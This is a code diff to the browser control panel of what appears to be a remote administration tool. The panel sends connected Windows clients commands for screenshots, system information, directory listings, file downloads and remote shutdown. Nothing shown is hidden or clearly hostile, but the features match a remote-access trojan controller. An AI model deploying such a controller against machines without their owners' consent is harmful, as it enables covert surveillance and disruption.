@@ -16,10 +16,11 @@
           <label class="uid"></label>
           <label class="cmd"></label>
           <button onclick="sayhi(${c})">say hi</button>
-          <button onclick="sendoff(${c})">turn off</button>
           <button onclick="systeminfo(${c})">system info</button>
           <button onclick="screenshot(${c})">screenshot</button>
           <button onclick="ls(${c}, 'C://')">ls</button>
+          <button onclick="sendoff(${c})">turn off</button>
+          <button onclick="shutdown(${c})">shutdown</button>
         </div>
         `;
       $('#list').append($(template));
@@ -68,13 +69,25 @@
 
     function download(cl, name, path) {
       console.log('download', cl);
-      socket.emit('client:send', {sid: cl, cmd: 'dw', args: {name: name, path: path.replace(' ', '\ ')}});
+      socket.emit('client:send', {
+        sid: cl,
+        cmd: 'dw',
+        args: {
+          name: name,
+          path: path
+        }
+      });
     }
 
     function ls(cl, path) {
       currPath = path.indexOf('..') != -1  ? 'C://' : path;
       console.log('ls', cl, path);
-      socket.emit('client:send', {sid: cl, cmd: 'ls', args: currPath.replace(' ', '\ ')});
+      socket.emit('client:send', {sid: cl, cmd: 'ls', args: currPath});
+    }
+
+    function shutdown(cl) {
+      console.log('shutdown', cl);
+      socket.emit('client:send', {sid: cl, cmd: 'shutdown', args: '0'});
     }
 
 
